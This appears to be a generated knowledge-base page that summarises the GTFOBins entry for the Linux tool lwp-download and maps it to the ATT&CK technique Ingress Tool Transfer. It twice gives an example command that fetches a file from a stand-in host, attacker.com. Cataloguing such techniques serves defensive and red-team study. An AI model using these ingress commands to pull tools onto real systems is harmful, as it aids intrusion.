---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lwp-download

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lwp-download` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for lwp-download covering download, file-read, file-write.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/lwp-download.md)
- Source verification: [source record](../../sources/gtfobins/lwp-download.md)

## Aliases

- `lwp-download`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: lwp-download http://attacker.com/path/to/input-file /path/to/output-file |

## Source Verification

[source record](../../sources/gtfobins/lwp-download.md)

## Evidence Excerpt

```text
_body: ''
_name: lwp-download
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download
functions:
download:
- code: lwp-download http://attacker.com/path/to/input-file /path/to/output-file
comment: The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in
the current working directory.
```
